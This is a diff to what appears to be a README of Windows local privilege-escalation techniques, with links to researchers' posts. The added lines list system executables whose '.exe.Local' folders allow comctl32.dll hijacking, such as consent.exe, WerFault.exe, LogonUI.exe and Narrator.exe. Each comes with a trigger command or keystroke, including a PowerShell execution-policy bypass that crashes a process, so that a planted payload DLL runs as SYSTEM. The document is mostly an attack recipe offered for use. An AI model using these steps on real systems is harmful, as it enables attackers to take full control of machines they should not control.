@@ -20,6 +20,7 @@ Thanks @PsiDragon for this advice.
 
 
 Another Method by @jonasLyk
+https://twitter.com/jonasLyk/status/1241314339623141376
 https://twitter.com/404death/status/1240917568870731776
 
 get SYSTEM shell from WerFault.exe via dll hijacking.
@@ -33,4 +34,14 @@ Same method with above.
 
 4. powershell -ep bypass -c "[Environment]::FailFast('Error')". Your payload dll will execute as SYSTEM.
 
-Another way by James Forshaw : https://googleprojectzero.blogspot.com/2017/08/windows-exploitation-tricks-arbitrary.html
+-------------------
+
+list process for directory create bug to system shell via comctl32.dll hijack like above methods.
+1. C:\Windows\System32\consent.exe.Local  (Triggered by running  narrator.exe)
+2. C:\Windows\System32\WerFault.exe.Local (Triggered by running  powershell -ep bypass -c "[Environment]::FailFast('Error')" )
+3. C:\Windows\System32\LogonUI.exe.Local (Triggered by running winkey+l)
+4. C:\Windows\System32\Narrator.exe.Local (Triggered by running winkey+l ,Ease of access)
+5. ...... etc
+
+
+Another exploitation tricks by James Forshaw : https://googleprojectzero.blogspot.com/2017/08/windows-exploitation-tricks-arbitrary.html
